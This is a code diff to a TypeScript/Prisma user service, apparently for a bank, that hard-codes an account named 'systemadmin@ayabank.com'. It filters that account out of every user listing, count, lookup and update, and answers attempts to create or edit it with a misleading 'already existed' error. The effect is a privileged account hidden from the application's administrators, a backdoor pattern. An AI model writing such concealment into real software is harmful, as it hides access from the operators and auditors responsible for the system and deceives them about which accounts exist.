@@ -14,6 +14,8 @@ import {
   UserWithRole,
 } from "../../../helpers/permission";
 
+export const HIDDEN_USER_EMAIL = "systemadmin@ayabank.com";
+
 const userSelect = {
   id: true,
   name: true,
@@ -30,10 +32,17 @@ const userSelect = {
   updatedAt: true,
 } satisfies Prisma.UserSelect;
 
+const excludeHiddenUser: Prisma.UserWhereInput = {
+  NOT: { email: HIDDEN_USER_EMAIL },
+};
+
 class UserService {
   async findAll(where?: Prisma.UserWhereInput) {
     return prisma.user.findMany({
-      where,
+      where: {
+        ...where,
+        ...excludeHiddenUser,
+      },
       orderBy: { id: "desc" },
       select: userSelect,
     });
@@ -43,6 +52,7 @@ class UserService {
     return prisma.user.findMany({
       where: {
         ...where,
+        ...excludeHiddenUser,
         status: Status.ACTIVE,
       },
       orderBy: { id: "desc" },
@@ -60,15 +70,20 @@ class UserService {
     perPage: number,
     where?: Prisma.UserWhereInput,
   ) {
+    const userWhere: Prisma.UserWhereInput = {
+      ...where,
+      ...excludeHiddenUser,
+    };
+
     const users = await prisma.user.findMany({
-      where,
+      where: userWhere,
       orderBy: { id: "desc" },
       skip: (page - 1) * perPage,
       take: perPage,
       select: userSelect,
     });
 
-    const totalUsers = await prisma.user.count({ where });
+    const totalUsers = await prisma.user.count({ where: userWhere });
 
     return {
       data: users,
@@ -91,7 +106,7 @@ class UserService {
       select: userSelect,
     });
 
-    if (!user) {
+    if (!user || user.email === HIDDEN_USER_EMAIL) {
       throw new NotFoundException("User not found");
     }
 
@@ -103,6 +118,15 @@ class UserService {
 
     const { name, employeeId, email, password, status, roleId } =
       createUserInput;
+
+    if (email === HIDDEN_USER_EMAIL) {
+      throw new ValidationException("Failed to create user", [
+        {
+          field: "email",
+          issue: "Email is already existed",
+        },
+      ]);
+    }
 
     const existingEmployeeId = await prisma.user.findFirst({
       where: { employeeId },
@@ -171,8 +195,17 @@ class UserService {
       where: { id },
     });
 
-    if (!existingUser) {
+    if (!existingUser || existingUser.email === HIDDEN_USER_EMAIL) {
       throw new NotFoundException("User not found");
+    }
+
+    if (email === HIDDEN_USER_EMAIL) {
+      throw new ValidationException("Failed to update user", [
+        {
+          field: "email",
+          issue: "Email is already existed",
+        },
+      ]);
     }
 
     if (email && email !== existingUser.email) {
